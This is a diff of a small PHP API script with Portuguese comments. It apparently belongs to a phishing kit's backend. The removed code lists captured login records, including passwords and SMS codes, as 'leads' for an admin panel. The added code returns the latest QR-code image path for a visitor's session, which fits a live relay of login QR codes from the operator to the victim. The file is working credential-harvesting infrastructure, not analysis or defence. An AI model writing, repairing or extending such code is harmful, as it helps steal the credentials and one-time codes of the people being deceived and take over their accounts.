@@ -1,43 +1,39 @@
 <?php
-// Define que a resposta será no formato JSON
 header('Content-Type: application/json');
+require_once __DIR__ . '/db.php'; // Conexão com o banco
 
-// Inclui o arquivo de conexão com o banco de dados
-require 'db.php';
+// 1. Identifica o usuário pelo cookie, como em todas as outras APIs.
+$session_id = $_COOKIE['identificador_cliente'] ?? null;
+if (!$session_id) {
+    // Se não houver cookie, não há como saber qual QR Code buscar.
+    echo json_encode(['success' => false, 'error' => 'Sessão do cliente não encontrada.']);
+    exit;
+}
 
 try {
-    // Prepara a consulta SQL para buscar todos os campos necessários de todos os registros.
-    // **Ajuste principal: Adicionamos a coluna 'sms_code' ao SELECT.**
-    // Ordenamos por 'id DESC' para que os leads mais recentes apareçam primeiro no painel.
-    $stmt = $pdo->prepare(
-        "SELECT 
-            id, 
-            session_id, 
-            identificador, 
-            senha, 
-            sms_code, -- <<< CAMPO ADICIONADO
-            qrcode_path, 
-            status, 
-            data_criacao 
-        FROM 
-            captura_login 
-        ORDER BY 
-            id DESC"
-    );
+    // 2. Busca o caminho do QR Code do registro mais recente para esta sessão.
+    $sql = "SELECT qrcode_path FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1";
+    $stmt = $pdo->prepare($sql);
+    $stmt->execute([$session_id]);
     
-    // Executa a consulta
-    $stmt->execute();
+    $result = $stmt->fetch(PDO::FETCH_ASSOC);
 
-    // Busca todos os resultados em um array associativo
-    $capturas = $stmt->fetchAll(PDO::FETCH_ASSOC);
-
-    // Retorna o array de capturas como uma resposta JSON
-    echo json_encode($capturas);
+    // 3. Verifica se um caminho de QR Code foi encontrado e não está vazio.
+    if ($result && !empty($result['qrcode_path'])) {
+        // SUCESSO: Envia o caminho da imagem para o JavaScript.
+        echo json_encode([
+            'success' => true,
+            'qrcode_path' => $result['qrcode_path']
+        ]);
+    } else {
+        // FALHA: Informa ao JavaScript que ainda não há um novo QR Code.
+        echo json_encode(['success' => false, 'error' => 'Nenhum QR Code encontrado para esta sessão.']);
+    }
 
 } catch (PDOException $e) {
-    // Em caso de erro com o banco de dados, retorna uma resposta de erro em JSON
-    // para que o painel de admin possa tratar o erro.
-    http_response_code(500); // Define o código de status HTTP para Erro de Servidor
-    echo json_encode(['success' => false, 'error' => 'Erro ao consultar o banco de dados: ' . $e->getMessage()]);
+    // Em caso de erro no banco, informa o erro.
+    error_log('Erro na API de get qrcode: ' . $e->getMessage());
+    http_response_code(500);
+    echo json_encode(['success' => false, 'error' => 'Erro interno do servidor.']);
 }
 ?>
